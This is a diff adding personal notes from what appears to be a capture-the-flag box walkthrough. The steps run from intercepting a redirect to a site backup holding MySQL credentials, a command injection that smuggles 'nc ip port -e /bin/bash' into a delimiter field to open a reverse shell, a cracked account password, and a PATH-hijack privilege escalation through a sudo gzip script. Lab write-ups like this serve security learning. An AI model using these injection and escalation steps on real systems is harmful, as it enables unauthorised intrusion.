@@ -8,3 +8,33 @@ Nmap scan only shows 22 is up to date
 config.php is found but blank
 
 Can curl other pages that redirect (accounts.php)
+
+Finding that requests are being forwarded, can intercept /accounts.php
+	Take action
+	Do intercept
+	Change the response code
+
+Can create an account and have access to the site
+
+Pulling sitebackup
+	in config find creds
+	root:mySQL_p@ssw0rd!:)
+
+FOOTHOLD
+	Looking through the site back up, see an exec call, can pass in any arg u want
+
+intercept the demlim
+delim=comma; nc ip port -e /bin/bash
+
+once foothold is gained, enumerate the mysql database :)
+	select * from accounts
+	get hash for m4lwhere
+
+cracked with my epic gpu
+	pw = ilovecody112235!
+
+Really cool priv esc
+	can run a script which uses gzip as sudo root
+	make a new binary called gzip and chagne the path to include the new binary
+	if new gzip is in your home
+			export PATH=/home/m4lwhere:$PATH
